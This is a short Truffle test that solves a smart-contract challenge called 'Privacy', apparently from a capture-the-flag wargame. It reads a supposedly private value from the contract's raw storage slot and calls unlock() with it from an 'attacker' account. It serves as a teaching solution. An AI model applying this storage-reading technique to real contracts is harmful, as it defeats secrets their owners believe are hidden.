const assert = require('assert');
const Privacy = artifacts.require('Privacy');

contract('Privacy', function ([deployer, attacker]) {
    beforeEach(async function () {
        const data = [
            web3.sha3('some'),
            web3.sha3('random'),
            web3.sha3('data')
        ];
        this.contract = await Privacy.new(data, { from: deployer });
        assert.equal(await this.contract.locked(), true);
    });

    it('passes the challenge', async function () {
        /* Contract storage:
            Position 0: locked, flattening, denomination, awkwardness
            Position 1: data[0]
            Position 2: data[1]
            Position 3: data[2]
        */

        // Read last position
        const data = await web3.eth.getStorageAt(this.contract.address, 3);
        
        // Unlock
        await this.contract.unlock(data, { from: attacker });
        assert.equal(await this.contract.locked(), false);
    });
});
